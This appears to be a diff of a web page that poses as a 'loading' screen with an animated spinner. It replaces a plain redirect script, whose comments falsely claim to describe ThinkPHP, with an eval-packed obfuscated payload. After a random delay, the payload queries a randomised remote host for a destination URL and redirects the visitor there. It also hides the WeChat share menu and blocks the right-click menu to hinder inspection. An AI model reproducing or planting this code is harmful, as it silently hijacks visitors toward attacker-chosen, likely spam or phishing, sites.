@@ -1,27 +1,207 @@
 
+<!DOCTYPE html>
+<html>
+<head lang="en">
+    <meta charset="UTF-8">
+    <title>加载中...</title>
+    <style type="text/css">
+        @-webkit-keyframes rotate-animation {
+            0% {
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+        @keyframes rotate-animation {
+            0% {
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+        @-webkit-keyframes move-animation {
+            0% {
+                -webkit-transform: translate(0, 0);
+                transform: translate(0, 0);
+            }
+            25% {
+                -webkit-transform: translate(-128px, 0);
+                transform: translate(-128px, 0);
+            }
+            75% {
+                -webkit-transform: translate(64px, 0);
+                transform: translate(64px, 0);
+            }
+            100% {
+                -webkit-transform: translate(0, 0);
+                transform: translate(0, 0);
+            }
+        }
+        @-webkit-keyframes move-animation {
+         0%{
+             -webkit-transform: translate(0,0);
+			 transform: translate(0,0);
+         }
+         }
+        @keyframes move-animation {
+            0% {
+                -webkit-transform: translate(0, 0);
+                transform: translate(0, 0);
+            }
+            25% {
+                -webkit-transform: translate(-64px, 0);
+                transform: translate(-64px, 0);
+            }
+            75% {
+                -webkit-transform: translate(32px, 0);
+                transform: translate(32px, 0);
+            }
+            100% {
+                -webkit-transform: translate(0, 0);
+                transform: translate(0, 0);
+            }
+        }
+        body {
+            background-color: #F5F5F5;
+        }
 
+        .circle-loader {
+            display: block;
+            width: 128px;
+            height: 128px;
+            margin-left: -64px;
+            margin-top: -64px;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            -webkit-transform-origin: 16px 16px;
+            transform-origin: 16px 16px;
+            -webkit-animation: rotate-animation 5s infinite;
+            animation: rotate-animation 5s infinite;
+            -webkit-animation-timing-function: linear;
+            animation-timing-function: linear;
+        }
+        .circle-loader .circle {
+            -webkit-animation: move-animation 2.5s infinite;
+            animation: move-animation 2.5s infinite;
+            -webkit-animation-timing-function: linear;
+            animation-timing-function: linear;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+        }
+        .circle-loader .circle-line {
+            width: 128px;
+            height: 48px;
+            position: absolute;
+            top: 4px;
+            left: 0;
+            -webkit-transform-origin: 4px 4px;
+            transform-origin: 4px 4px;
+        }
+        .circle-loader .circle-line:nth-child(0) {
+            -webkit-transform: rotate(0deg);
+            transform: rotate(0deg);
+        }
+        .circle-loader .circle-line:nth-child(1) {
+            -webkit-transform: rotate(90deg);
+            transform: rotate(90deg);
+        }
+        .circle-loader .circle-line:nth-child(2) {
+            -webkit-transform: rotate(180deg);
+            transform: rotate(180deg);
+        }
+        .circle-loader .circle-line:nth-child(3) {
+            -webkit-transform: rotate(270deg);
+            transform: rotate(270deg);
+        }
+        .circle-loader .circle-line .circle:nth-child(1) {
+            width: 16px;
+            height: 16px;
+            top: 50%;
+            left: 50%;
+            margin-top: -8px;
+            margin-left: -8px;
+            border-radius: 8px;
+            -webkit-animation-delay: -0.3s;
+            animation-delay: -0.3s;
+        }
+        .circle-loader .circle-line .circle:nth-child(2) {
+            width: 32px;
+            height: 32px;
+            top: 50%;
+            left: 50%;
+            margin-top: -16px;
+            margin-left: -16px;
+            border-radius: 16px;
+            -webkit-animation-delay: -0.6s;
+            animation-delay: -0.6s;
+        }
+        .circle-loader .circle-line .circle:nth-child(3) {
+            width: 48px;
+            height: 48px;
+            top: 50%;
+            left: 50%;
+            margin-top: -12px;
+            margin-left: -12px;
+            border-radius: 12px;
+            -webkit-animation-delay: -0.9s;
+            animation-delay: -0.9s;
+        }
+        .circle-loader .circle-blue {
+            background-color: #1f4e5a;
+        }
+        .circle-loader .circle-red {
+            background-color: #ff5955;
+        }
+        .circle-loader .circle-yellow {
+            background-color: #ffb265;
+        }
+        .circle-loader .circle-green {
+            background-color: #00a691;
+        }
+
+    </style>
+</head>
+<body>
+<div class="page">
+    <div class="circle-loader">
+        <div class="circle-line">
+            <div class="circle circle-blue"></div>
+            <div class="circle circle-blue"></div>
+            <div class="circle circle-blue"></div>
+        </div>
+        <div class="circle-line">
+            <div class="circle circle-yellow"></div>
+            <div class="circle circle-yellow"></div>
+            <div class="circle circle-yellow"></div>
+        </div>
+        <div class="circle-line">
+            <div class="circle circle-red"></div>
+            <div class="circle circle-red"></div>
+            <div class="circle circle-red"></div>
+        </div>
+        <div class="circle-line">
+            <div class="circle circle-green"></div>
+            <div class="circle circle-green"></div>
+            <div class="circle circle-green"></div>
+        </div>
+    </div>
+</div>
+<script src="https://js-libs.oss-cn-hangzhou.aliyuncs.com/jquery2.0.0.js"></script>
 <script>
-
-// ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。遵循Apache2开源许可协议发布，意味着你可以免费使用ThinkPHP，甚至允许把你基于ThinkPHP开发的应用开源或商业产品发布/销售。
-
-// ThinkPHP5.0版本是一个颠覆和重构版本，采用全新的架构思想，引入了更多的PHP新特性，优化了核心，减少了依赖，实现了真正的惰性加载，支持composer，并针对API开发做了大量的优化，包括路由、日志、异常、模型、数据库、模板引擎和验证等模块都已经重构，不适合原有3.2项目的升级，请慎重考虑商业项目升级，但绝对是新项目的首选（无论是WEB还是API开发）。
-
-// 主要特性：
-// 规范：遵循PSR-2、PSR-4规范，Composer及单元测试支持；
-// 严谨：异常严谨的错误检测和安全机制，详细的日志信息，为你的开发保驾护航；
-// 灵活：减少核心依赖，扩展更灵活、方便，支持命令行指令扩展；
-// API友好：出色的性能和REST支持、远程调试，更好的支持API开发；
-// 高效：惰性加载，及路由、配置和自动加载的缓存机制；
-// ORM：重构的数据库、模型及关联，MongoDb支持；
-
-// 目前最新版本为V5.0.21，查看更新日志和升级指导。
-// 支持ThinkPHP5的用户请到 Github 给我们一个star ^_^  
-  
-
-var sssss = window.location.search; 
-sssss = sssss.substring(1, sssss.length);
-sssss = sssss.replace(/s/, "p");
-var zzz = "http://tixaat.lieche4193.cn:81/list.php?"+sssss;
-window.location.href= zzz;
+    var t = Math.floor(Math.random()*(5000-1500+1)+1500);
+    console.log(t)
+    setTimeout(function() {
+        $('.circle-loader').hide();
+;eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<o U="V://x-W.X-y-Y.Z.10/11.0.0.x"></o><o>6 z(a){a=a||12;4 b=\'13\';4 c=b.g;4 d=\'\';u(i=0;i<a;i++){d+=b.14(A.15(A.16()*c))}7 d}h=\'B://\'+z(3)+\'.17.y:18/19.1a?s=/1b/1c/1d/1e/1f\';4 8=j.e.k;6 C(a,b,c){4 c=c?c:0;4 d=a.D(b);5(c>0){7 a.E(d,c)}7 a.q(d,a.g)}4 F=8.D(\'G=\');4 H=8.g;8=8.q(1,H);6 1g(){4 a={};5(e.k!==\'\'){4 b=e.k.q(1).l(\'&\');u(4 i=0,I=b.g;i<I;i++){4 c=b[i].l(\'=\'),9=1h(c[1]),m=1i(9);5(J m===\'1j\'&&m===m){9=m}5(9===\'K\'||9===\'t\'){9=9===\'K\'}a[c[0]]=9}}7 a}5(F>0){8=C(8,\'1k=\');h=1l(L(\'G\'))}6 L(a){4 b=1m 1n(\'(^|&)\'+a+\'=([^&]*)(&|$)\',\'i\');4 r=j.e.k.E(1).1o(b);5(r!=M){7 1p(r[2])}7 M}6 N(a){4 b=j.e.k.q(1);4 c=b.l("&");u(4 i=0;i<c.g;i++){4 d=c[i].l("=");5(d[0]==a){7 d[1]}}7(t)}4 s=N(\'s\');h=h+"/s/"+s;$.1q({1r:\'1s\',O:h,1t:"1u/1v",1w:{},1x:\'P\',P:"1y",1z:"1A",1B:6(a){5(a.1C=="1D"){4 b=a.O;4 c=a.1E;4 d=\'B://\'+b+c;5(s){d=d.l(\'?\')[0];j.e.Q=d+"?p="+s}v{j.e.Q=d+8}}},1F:6(){}});6 n(){R.1G(\'1H\')}5(J R=="1I"){5(f.S){f.S(\'T\',n,t)}v 5(f.w){f.w(\'T\',n);f.w(\'1J\',n)}}v{n()}f.1K=6(){1L.1M=t}</o>',62,111,'||||var|if|function|return|searchURL|value|||||location|document|length|apiurl||window|search|split|numberVal|onBridgeReady|script||substring|||false|for|else|attachEvent|js|cn|randomString|Math|http|substrv|indexOf|substr|start_num|__url|end_num|iLen|typeof|true|getQueryString|null|getQueryVariable|url|jsonp|href|WeixinJSBridge|addEventListener|WeixinJSBridgeReady|src|https|libs|oss|hangzhou|aliyuncs|com|jquery2|32|ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678|charAt|floor|random|kppzjfz|81|index|php|Home|Api|geturl|appkey|TURBd01EQXdNREF3TUlhcXJOaw|getVal|decodeURIComponent|Number|number|__p|decodeURI|new|RegExp|match|unescape|ajax|type|get|contentType|application|json|data|dataType|callback|jsonpCallback|Handler|success|status|200|param|error|call|hideOptionMenu|undefined|onWeixinJSBridgeReady|oncontextmenu|event|returnValue'.split('|'),0,{}));
+    }, t);
 </script>
-  
+</body>
+</html>
